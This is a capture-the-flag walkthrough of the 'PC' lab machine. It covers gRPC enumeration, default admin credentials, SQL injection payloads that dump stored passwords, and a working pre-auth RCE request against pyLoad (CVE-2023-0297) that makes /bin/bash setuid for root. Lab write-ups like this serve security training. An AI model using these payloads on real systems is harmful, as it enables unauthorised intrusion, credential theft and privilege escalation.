# easy - PC Machine

## User flag

Let's scan the network:
`➤ sudo nmap -nv -Pn -sC -sV -O -T4 -oA nmap-scan pc.htb`

Which only reports port 22/tcp open:
```bash
➤ cat nmap-scan.nmap | ag open
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
```
Let's try scanning all ports TCP and UDP:
- -sS -p- pc.htb
- -sU -p- pc.htb

I've found this:
- `50051/tcp open  unknown`

I don't get it yet, there is something on that 50051/tcp port:
```bash
➤ echo wtf | nc pc.htb 50051
???%

➤ curl http://pc.htb:50051
curl: (1) Received HTTP/0.9 when not allowed

➤ curl -k https://pc.htb:50051
curl: (35) OpenSSL/3.0.9: error:0A00010B:SSL routines::wrong version number
```
After a quick check in wikipedia, it seems that port 50051 is used by gRPC, so what is it?:
> gRPC (gRPC Remote Procedure Calls ) is a cross-platform open source high performance remote procedure call (RPC) framework. gRPC was initially created by Google, which used a single general-purpose RPC infrastructure called Stubby... It uses HTTP/2 for transport, ...

So lets get a client `grpc_cli`:
```bash
# Listing what we have in that service
➤ grpc_cli ls pc.htb:50051
SimpleApp
grpc.reflection.v1alpha.ServerReflection

# Listing what we have in SimpleApp:
➤ grpc_cli ls pc.htb:50051 SimpleApp -l
filename: app.proto
service SimpleApp {
  rpc LoginUser(LoginUserRequest) returns (LoginUserResponse) {}
  rpc RegisterUser(RegisterUserRequest) returns (RegisterUserResponse) {}
  rpc getInfo(getInfoRequest) returns (getInfoResponse) {}
}

# Checking RegisterUserRequest structure
➤ grpc_cli type pc.htb:50051 RegisterUserRequest
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}

# Trying to register
➤ grpc_cli call pc.htb:50051 SimpleApp.RegisterUser ''
connecting to pc.htb:50051
message: "username or password must be greater than 4"
Rpc succeeded with OK status

➤ grpc_cli call pc.htb:50051 SimpleApp.RegisterUser 'username: "foobar", password: "foobar"'
connecting to pc.htb:50051
message: "Account created for user foobar!"
Rpc succeeded with OK status

# Logging
➤ grpc_cli call pc.htb:50051 SimpleApp.LoginUser 'username: "foobar", password: "foobar"'
connecting to pc.htb:50051
message: "Your id is 732."
Received trailing metadata from server:
token : b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZm9vYmFyIiwiZXhwIjoxNjg2MzcwMjQ2fQ.VVFuG6VhJhRSeNJdckmOAtTdlOTjDzeNlQ3ri6rLt_A'
Rpc succeeded with OK status

# Testing getInfo
➤ grpc_cli type pc.htb:50051 getInfoRequest
message getInfoRequest {
  string id = 1;
}
➤ grpc_cli call pc.htb:50051 SimpleApp.getInfo 'id: "732"'
connecting to pc.htb:50051
message: "Authorization Error.Missing \'token\' header"
Rpc succeeded with OK status
```

Ok, so the deal is that `grpc_cli` doesnt' support headers, we cannot set token, I already tried. Let's use a python client, but for that we need to get the `.proto` file for the service.

```bash
➤ grpcurl -plaintext pc.htb:50051 describe SimpleApp > protos/SimpleApp.proto
➤ file protos/SimpleApp.proto
protos/SimpleApp.proto: ASCII text

# I had to modify it like this:
➤ cat protos/SimpleApp.proto
syntax = "proto3";
message getInfoRequest {
  string id = 1;
}
message getInfoResponse {
  string message = 1;
}
service SimpleApp {
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}

➤ python -m grpc_tools.protoc -I./protos --python_out=. --grpc_python_out=. ./protos/SimpleApp.proto
```
Up to this point I wanted to run a gRPC python client which was failing for me with multiple tries & configurations. After googling I've found this tool `grpcui` which proxies this grpc http2 to a regular http browsing on your default webbrowser.

{{< limg "/i/2023-06-09_21-57.png" "Browsing gRPC via web UI" >}} 

... and `curl` works now! :smile:
```bash
➤ curl -I 'http://127.0.0.1:45031/'
HTTP/1.1 200 OK
Cache-Control: private, must-revalidate
Content-Length: 7295
Content-Type: text/html; charset=utf-8
Etag: udpVnrYoZ_4aBEHdR5XGR3NBKthwmecSkANDb7yNGyM
Set-Cookie: _grpcui_csrf_token=idCj6O8TOcjLeSiX8ktXOifq_STTps1-PeGVHvbMT9U
Date: Sat, 10 Jun 2023 01:59:45 GMT
```

I wanted to try to create an user foobar and explore from there but I tested that `admin:admin` are valid **default** credentials!!

So the problem is that this id changes over the time and also the token becames invalid, so I have to automate it to get a new fresh id and its token on each request. This time I will just work with `grpcurl`.

```bash
# The bash script
grpcurl \
  -plaintext \
  -d '{"id": "512"}' \
  -rpc-header 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODYzNzM2NTB9.kkejZIKZXMjf9PI1LfniU7PUwCPGWmDCJsNMml3TbWk' \
  pc.htb:50051 SimpleApp.getInfo

{
  "message": "Will update soon."
}
```

Here the automated code:
```bash
response=$( grpcurl -v -plaintext \
  -d '{"username":"admin", "password":"admin"}' \
  pc.htb:50051 SimpleApp.LoginUser | ag 'token|message'
)

idnumber=$(echo "${response}" | sed 's/token.*//' | sed -n 's/[^0-9]*\([0-9]\+\).*/\1/p')
token=$(echo "${response}" | sed -n "s/.*b'\([^']*\)'.*/\1/p")

payload='{"id":"'"${idnumber} UNION SELECT 12345"'"}'
grpcurl \
  -plaintext \
  -d "${payload}" \
  -rpc-header 'token: '"${token}" \
  pc.htb:50051 SimpleApp.getInfo


{
  "message": "12345"
}
```

So now I will try different payloads:
```bash
# Checking error info leak
payload='{"id":"'"${idnumber}; SELECT 0"'"}'
ERROR:
  Code: Unknown
  Message: Unexpected <class 'sqlite3.Warning'>: You can only execute one statement at a time.

# Checking version
payload='{"id":"'"${idnumber} UNION SELECT sqlite_version()"'"}'
{ "message": "3.31.1" }

# SQLi-ing
payload='{"id":"'"-1 union select group_concat(username) from accounts"'"}'
{ "message": "admin,sau" }

payload='{"id":"'"-1 union select group_concat(password) from accounts"'"}'
{ "message": "admin,HereIsYourPassWord1431" }
```

And we've got sau's ssh access:
```bash
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
sau@pc:~$ ls
user.txt
```

## Root flag
```bash
sau@pc:~$ sudo -l
[sudo] password for sau:
Sorry, user sau may not run sudo on localhost.
```

Checking network:
```bash
sau@pc:~$ netstat -tlpn | grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::50051                :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```
That 8000/tcp is running a PyLoad app (SSH Proxy to your local is required here):
```bash
➤ curl -s -L http://localhost:8000 | ag pyload
<title>Login - pyLoad </title>
      <img alt="Pyload" src="/_themes/modern/img/pyload-logo.png">
```

... and as a magic I found a github repo created 5 months ago :smile: **CVE-2023-0297: Pre-auth RCE in pyLoad** https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad where PyLoad is using a vulnerable function `eval_js()` where we can send malicious payload remotely without authentication at all :smile: - let's make /bin/bash suid.

`chmod u+s /bin/bash` = `%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68`
```bash
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://localhost:8000/flash/addcrypted2'
```
And voilá:
```bash
sau@pc:~$ ls -ltra /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
sau@pc:~$ ls -ltra /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
sau@pc:~$ /bin/bash -p
bash-5.0# id
uid=1001(sau) gid=1001(sau) euid=0(root) groups=1001(sau)
```
